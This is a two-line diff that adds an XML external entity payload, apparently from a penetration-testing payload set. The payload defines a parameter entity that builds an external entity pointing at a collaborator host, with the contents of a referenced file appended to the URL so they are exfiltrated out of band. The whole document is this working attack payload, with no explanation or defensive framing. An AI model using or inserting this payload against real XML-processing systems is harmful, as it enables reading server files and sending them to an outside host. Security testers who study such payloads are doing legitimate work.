@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://h9rscdjlthupcvbikv8uks15pwvnjc.pentestcollaborator.com/?collect=%file;'>">
+%all;
